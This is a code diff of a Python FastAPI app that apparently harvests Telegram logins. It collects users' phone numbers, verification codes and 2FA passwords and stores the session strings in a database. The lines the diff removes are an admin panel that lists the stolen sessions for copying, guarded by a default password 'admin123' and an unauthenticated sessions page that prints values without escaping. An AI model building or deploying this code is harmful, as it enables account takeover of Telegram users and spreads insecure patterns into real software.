@@ -1,4 +1,3 @@
-# app.py
 import os
 import sqlite3
 from fastapi import FastAPI, Request, Form, HTTPException
@@ -13,9 +12,10 @@ templates = Jinja2Templates(directory=".")
 
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
-ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
+ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
 DB = "sessions.db"
 
+# In-memory clients
 CLIENTS = {}
 
 # === DATABASE ===
@@ -24,6 +24,7 @@ def init_db():
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.close()
 
+# CLEAR OLD SESSION ON START (for testing)
 if os.getenv("CLEAR_DB") == "1":
     if os.path.exists(DB):
         os.remove(DB)
@@ -58,6 +59,7 @@ async def home(request: Request):
     if not phone:
         raise HTTPException(400, "Phone required")
     
+    # Auto-clear old session
     if phone in CLIENTS:
         del CLIENTS[phone]
     delete_session(phone)
@@ -101,56 +103,3 @@ async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(
         return JSONResponse({"error": "Wrong code"})
     except Exception as e:
         return JSONResponse({"error": str(e)})
-
-# === ADMIN PANEL ===
-@app.get("/admin")
-async def admin_login():
-    return HTMLResponse("""
-    <form method="post">
-      <h2>Admin Login</h2>
-      <input type="password" name="password" placeholder="Password" required>
-      <button type="submit">Login</button>
-    </form>
-    """)
-
-@app.post("/admin")
-async def admin_check(password: str = Form(...)):
-    if password != ADMIN_PASS:
-        raise HTTPException(403, "Wrong password")
-    return RedirectResponse("/admin/sessions", status_code=303)
-
-@app.get("/admin/sessions", response_class=HTMLResponse)
-async def admin_sessions():
-    conn = sqlite3.connect(DB)
-    c = conn.cursor()
-    c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
-    rows = c.fetchall()
-    conn.close()
-
-    html = "<h2>Sessions</h2><ol>"
-    for r in rows:
-        html += f"""
-        <li style='margin:1rem 0;'>
-            <b>{r[0]}</b> ({r[2]})<br>
-            <textarea style='width:100%;height:80px;font-family:monospace;'>{r[1]}</textarea>
-            <button onclick='navigator.clipboard.writeText(this.previousElementSibling.value);alert(\"Copied\")'>Copy</button>
-            <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;'>Delete</a>
-        </li>
-        """
-    html += "</ol><a href='/admin'>Back</a>"
-    return HTMLResponse(html)
-
-@app.get("/admin/delete")
-async def delete(phone: str):
-    delete_session(phone)
-    return RedirectResponse("/admin/sessions")
-
-# AT THE END OF app.py — ADD THIS:
-import uvicorn
-
-if __name__ == "__main__":
-    import os
-    port = int(os.getenv("PORT", 8000))  # Railway sets PORT
-    uvicorn.run("app:app", host="0.0.0.0", port=port)
-
-# === NO check_admin() needed — simplified ===
